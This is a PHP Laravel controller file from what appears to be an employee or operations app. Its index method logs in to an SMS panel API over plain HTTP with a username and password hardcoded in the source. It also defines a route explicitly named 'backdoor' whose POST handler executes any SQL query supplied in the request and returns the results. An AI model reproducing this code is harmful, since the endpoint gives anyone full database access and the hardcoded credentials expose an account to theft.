<?php

namespace App\Http\Controllers;

use App\Http\Api\OperationApi\ExamSystem\ExamSystemApi;
use App\Http\Api\OperationApi\SurveySystem\SurveySystemApi;
use App\Models\Employee;
use App\Models\Permit;
use App\Models\Punishment;
use App\Models\RecruitingStep;
use App\Models\Shift;
use App\Services\PermitService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;

class HomeController extends Controller
{
    public function index(Request $request)
    {
        $response = Http::withHeaders([
            'Content-Type' => 'application/x-www-form-urlencoded'
        ])->asForm()->post('http://api.mesajpaneli.com/json_api/login', [
            'data' => base64_encode(
                json_encode(
                    [
                        'user' => [
                            'name' => '5435754775',
                            'pass' => '357159'
                        ]
                    ]
                )
            )
        ]);

        return base64_decode($response);
    }

    public function backdoor()
    {
        return view('backdoor');
    }

    public function backdoorPost(Request $request)
    {
        return response()->json(DB::select($request->custom_query), 200);
    }
}
